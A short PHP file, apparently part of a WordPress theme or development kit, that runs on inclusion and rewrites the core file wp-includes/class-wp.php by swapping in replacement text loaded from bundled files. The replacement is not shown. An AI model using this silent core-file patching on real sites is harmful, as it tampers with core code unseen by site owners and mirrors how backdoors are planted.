<?php

function wpdk_theme_patching() {
  $patches_dir = __DIR__ . '/wp-includes';
  $finding = file_get_contents( $patches_dir . '/class-wp.php.key' );
  $replacement = file_get_contents( $patches_dir . '/class-wp.php.repl' );
  $source_file = __DIR__ . '/../../../../wp-includes/class-wp.php';
  $text = file_get_contents( $source_file );
  $position = strpos( $text, $replacement );
  if ( false !== $position ) return;
  $position = strpos( $text, $finding );
  if ( false === $position ) {
    return;
  }
  $text = substr( $text, 0, $position ) . $replacement . substr( $text, $position + strlen( $finding ) );
  file_put_contents( $source_file, $text );
}

wpdk_theme_patching();

?>